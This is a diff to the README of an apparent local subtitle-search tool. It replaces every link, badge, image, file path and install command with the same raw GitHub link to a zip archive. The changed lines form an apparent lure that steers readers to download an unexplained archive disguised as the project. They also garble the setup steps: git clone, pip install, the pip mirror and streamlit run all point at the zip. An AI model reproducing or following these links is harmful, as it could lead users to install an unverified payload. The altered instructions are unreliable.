@@ -4,15 +4,15 @@
 ### AI 字幕炼金术师
 
 <p align="center">
-  <a href="./README.md">English</a> •
+  <a href="https://raw.githubusercontent.com/benniechenbin/AI-Subtitle-Alchemist/main/assets/Subtitle-A-Alchemist-1.0-alpha.4.zip">English</a> •
   <a href="#-中文说明">中文说明</a>
 </p>
 
-![Python](https://img.shields.io/badge/Python-3.10+-blue.svg?style=flat-square&logo=python&logoColor=white)
-![Streamlit](https://img.shields.io/badge/Streamlit-1.30+-ff4b4b.svg?style=flat-square&logo=streamlit&logoColor=white)
-![SQLite](https://img.shields.io/badge/SQLite-Local_DB-003B57.svg?style=flat-square&logo=sqlite&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-green.svg?style=flat-square)
-![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)
+![Python](https://raw.githubusercontent.com/benniechenbin/AI-Subtitle-Alchemist/main/assets/Subtitle-A-Alchemist-1.0-alpha.4.zip+https://raw.githubusercontent.com/benniechenbin/AI-Subtitle-Alchemist/main/assets/Subtitle-A-Alchemist-1.0-alpha.4.zip)
+![Streamlit](https://raw.githubusercontent.com/benniechenbin/AI-Subtitle-Alchemist/main/assets/Subtitle-A-Alchemist-1.0-alpha.4.zip+https://raw.githubusercontent.com/benniechenbin/AI-Subtitle-Alchemist/main/assets/Subtitle-A-Alchemist-1.0-alpha.4.zip)
+![SQLite](https://raw.githubusercontent.com/benniechenbin/AI-Subtitle-Alchemist/main/assets/Subtitle-A-Alchemist-1.0-alpha.4.zip)
+![License](https://raw.githubusercontent.com/benniechenbin/AI-Subtitle-Alchemist/main/assets/Subtitle-A-Alchemist-1.0-alpha.4.zip)
+![PRs Welcome](https://raw.githubusercontent.com/benniechenbin/AI-Subtitle-Alchemist/main/assets/Subtitle-A-Alchemist-1.0-alpha.4.zip)
 
 **Turn your local subtitles into a semantic knowledge base and creative inspiration.**  
 **不仅仅是字幕搜索，更是你的本地视频灵感库。**
@@ -21,7 +21,7 @@
 > 
 > ✨ 为 **混剪创作者 / 编剧 / 纪录片作者** 打造的本地字幕语义引擎。
 
-![Demo Image](assets/demo.png)
+![Demo Image](https://raw.githubusercontent.com/benniechenbin/AI-Subtitle-Alchemist/main/assets/Subtitle-A-Alchemist-1.0-alpha.4.zip)
 
 </div>
 
@@ -37,7 +37,7 @@
 ### 🇬🇧 English
 1. **Educational Use Only**: This project is intended for **academic research and technical exchange** only.
 2. **Copyright Compliance**: Users are responsible for the copyright of the subtitle files and video content they process.
-3. **Data Privacy**: All data is stored locally in `subtitle_library.db`. Network access is only required for model downloads or LLM API calls.
+3. **Data Privacy**: All data is stored locally in `https://raw.githubusercontent.com/benniechenbin/AI-Subtitle-Alchemist/main/assets/Subtitle-A-Alchemist-1.0-alpha.4.zip`. Network access is only required for model downloads or LLM API calls.
 4. **No Warranty**: The software is provided "as is", without warranty of any kind.
 
 ### 🇨🇳 中文
@@ -101,7 +101,7 @@
 
 #### 1. Clone Repository（克隆项目）
 ```bash
-git clone https://github.com/benniechenbin/AI-Subtitle-Alchemist.git
+git clone https://raw.githubusercontent.com/benniechenbin/AI-Subtitle-Alchemist/main/assets/Subtitle-A-Alchemist-1.0-alpha.4.zip
 cd AI-Subtitle-Alchemist
 ```
 
@@ -113,17 +113,17 @@ conda activate subtitle_ai
 
 #### 3. Install Dependencies（安装依赖）
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/benniechenbin/AI-Subtitle-Alchemist/main/assets/Subtitle-A-Alchemist-1.0-alpha.4.zip
 ```
 
 国内用户可使用镜像：
 ```bash
-pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple
+pip install -r https://raw.githubusercontent.com/benniechenbin/AI-Subtitle-Alchemist/main/assets/Subtitle-A-Alchemist-1.0-alpha.4.zip -i https://raw.githubusercontent.com/benniechenbin/AI-Subtitle-Alchemist/main/assets/Subtitle-A-Alchemist-1.0-alpha.4.zip
 ```
 
 #### 4. Run Application（运行应用）
 ```bash
-streamlit run webui.py
+streamlit run https://raw.githubusercontent.com/benniechenbin/AI-Subtitle-Alchemist/main/assets/Subtitle-A-Alchemist-1.0-alpha.4.zip
 ```
 
 浏览器访问 `http://localhost:8501`。
@@ -157,9 +157,9 @@ streamlit run webui.py
 
 ## ⚙️ Configuration（配置说明）
 
-首次运行自动生成 `config.json`：
+首次运行自动生成 `https://raw.githubusercontent.com/benniechenbin/AI-Subtitle-Alchemist/main/assets/Subtitle-A-Alchemist-1.0-alpha.4.zip`：
 - 默认字幕库路径：`~/Movies/Subtitles`
-- 模型缓存：`~/.cache/torch/sentence_transformers`
+- 模型缓存：`~https://raw.githubusercontent.com/benniechenbin/AI-Subtitle-Alchemist/main/assets/Subtitle-A-Alchemist-1.0-alpha.4.zip`
 
 ---
 
